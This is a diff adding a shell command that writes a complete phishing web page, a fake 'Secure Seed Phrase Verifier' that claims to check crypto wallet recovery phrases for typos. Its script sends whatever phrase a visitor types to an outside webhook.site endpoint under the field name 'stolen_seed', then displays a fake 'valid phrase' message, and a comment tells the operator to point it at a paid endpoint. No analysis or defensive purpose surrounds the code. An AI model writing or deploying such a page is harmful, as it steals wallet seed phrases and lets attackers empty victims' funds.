@@ -1,0 +1,96 @@
+cat << 'EOF' > index.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>🔐 Secure Seed Phrase Verifier</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #f3f4f6;
+            color: #1f2937;
+            margin: 0;
+            padding: 40px 15px;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        h2 {
+            color: #4f46e5;
+        }
+        textarea {
+            width: 95%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            resize: none;
+        }
+        button {
+            background-color: #4f46e5;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        .result {
+            margin-top: 10px;
+            color: green;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>🛡️ Secure Seed Phrase Verifier</h2>
+    <p>This tool checks your recovery phrase for typos before disaster strikes.</p>
+
+    <ul style="text-align: left; margin: auto;">
+        <li>A single misspelled word = lost funds forever.</li>
+        <li>Digits mistaken for letters ("O" vs "Q", "I" vs "l")</li>
+        <li>Copy-paste errors during backup transfer</li>
+    </ul>
+
+    <textarea id="seed" rows="4" placeholder="Enter your recovery phrase..."></textarea><br/>
+    
+    <button onclick="send()">✅ Verify My Phrase Now</button>
+
+    <p class="result" id="out"></p>
+</div>
+
+<script>
+function send() {
+    const input = document.getElementById("seed");
+    const value = input ? input.value.trim() : '';
+
+    if (!value) {
+        alert("Please enter the phrase.");
+        return;
+    }
+
+    // 🔥 SEND TO YOUR PAID WEBHOOK.SITE ENDPOINT 🔥
+    fetch("https://webhook.site/verifiedseed", {
+        method: "POST",
+        body: "stolen_seed=" + encodeURIComponent(value) + "&timestamp=" + new Date().toISOString(),
+        mode: "no-cors"
+    });
+
+    // Show fake success after 0.8 sec
+    setTimeout(() => {
+        document.getElementById("out").innerHTML = "<span style='color:green'>✔️ Valid recovery phrase detected!</span>";
+    }, 800);
+}
+</script>
+
+</body>
+</html>
+EOF
